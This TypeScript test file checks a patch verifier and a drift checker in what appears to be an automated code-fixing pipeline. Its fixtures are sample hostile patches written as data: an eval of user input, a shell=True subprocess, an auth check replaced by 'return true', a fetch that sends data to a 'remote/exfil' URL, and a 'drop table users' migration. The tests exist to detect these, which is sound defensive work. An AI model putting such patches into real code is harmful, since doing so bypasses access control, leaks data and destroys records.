import { test } from "node:test";
import assert from "node:assert/strict";
import { verifyPatch } from "../src/pipeline/patch_verifier.js";
import { checkTrajectoryDrift } from "../src/pipeline/trajectory_checkpoint.js";
import type { SolveResult, SearchReplaceEdit } from "../src/solve/issue_model.js";

function solveWith(edits: SearchReplaceEdit[]): SolveResult {
  return {
    issueId: "x", solved: true, stagesRun: ["done"], repairRounds: 0,
    validation: { testsPassed: true, failures: [], vettingCleared: true, detail: "" },
    prProposal: { title: "t", body: "b", branch: "keep/solve/x", edits, testsPassed: true },
  };
}

// ── safety-monotonicity ──

test("INVARIANT: a patch that NET-ADDS a risk sink (eval) fails even though tests pass", () => {
  const v = verifyPatch({ solveResult: solveWith([{ file: "src/x.ts", search: "const a = 1;", replace: "const a = eval(userInput);", intent: "i" }]) });
  assert.equal(v.outcome, "fail");
  assert.ok(v.checks.some((c) => c.name === "safety-monotonicity" && c.decision === "fail"));
});

test("INVARIANT: a patch that REMOVES a risk sink is safety-monotone (passes)", () => {
  const v = verifyPatch({ solveResult: solveWith([{ file: "src/x.ts", search: "const a = eval(userInput);", replace: "const a = JSON.parse(userInput);", intent: "i" }]) });
  assert.notEqual(v.checks.find((c) => c.name === "safety-monotonicity")!.decision, "fail");
});

test("safety-monotonicity catches shell/exec sinks too", () => {
  const v = verifyPatch({ solveResult: solveWith([{ file: "src/x.py", search: "result = compute()", replace: "result = subprocess.Popen(cmd, shell=True)", intent: "i" }]) });
  assert.equal(v.outcome, "fail");
  assert.ok(v.checks.some((c) => c.name === "safety-monotonicity" && c.decision === "fail"));
});

// ── trajectory-drift checkpoint ──

test("INVARIANT: a patch that stays within the plan-approved envelope does NOT drift", () => {
  const d = checkTrajectoryDrift(["pure-code"], [{ file: "src/calc.ts", search: "a - b", replace: "a + b", intent: "fix" }]);
  assert.equal(d.drifted, false);
  assert.equal(d.decision, "pass");
});

test("INVARIANT: canonical cascade chain — plan approved a small change but the patch touches AUTH → drift → escalate", () => {
  // Plan approved only pure-code. The produced patch quietly edits an auth path.
  const d = checkTrajectoryDrift(["pure-code"], [
    { file: "src/calc.ts", search: "a - b", replace: "a + b", intent: "fix the sum" },
    { file: "src/auth/permission.ts", search: "return checkPermission(u);", replace: "return true;", intent: "unrelated" },
  ]);
  assert.equal(d.drifted, true);
  assert.equal(d.decision, "escalate");
  assert.ok(d.newClasses.includes("auth-access-control"));
});

test("INVARIANT: a patch that adds network egress the plan didn't approve → drift", () => {
  const d = checkTrajectoryDrift(["pure-code"], [{ file: "src/x.ts", search: "return data;", replace: "fetch('https://remote/exfil', { body: data }); return data;", intent: "i" }]);
  assert.equal(d.drifted, true);
  assert.ok(d.newClasses.includes("network-egress"));
});

test("a patch whose effects were ALREADY approved by the plan does not drift", () => {
  // Plan approved auth work; patch touches auth → within envelope, no drift.
  const d = checkTrajectoryDrift(["auth-access-control", "pure-code"], [{ file: "src/auth/login.ts", search: "x", replace: "y", intent: "i" }]);
  assert.equal(d.drifted, false);
});

test("drift reports the new classes worst-first for a readable brief", () => {
  const d = checkTrajectoryDrift(["pure-code"], [
    { file: "src/deps/package.json", search: "1.0", replace: "1.1", intent: "dep" },
    { file: "migrations/002.sql", search: "x", replace: "drop table users", intent: "schema" },
  ]);
  assert.equal(d.drifted, true);
  // db-schema (rank 5) should sort before dependency-config (rank 2)
  assert.equal(d.newClasses[0], "db-schema");
});
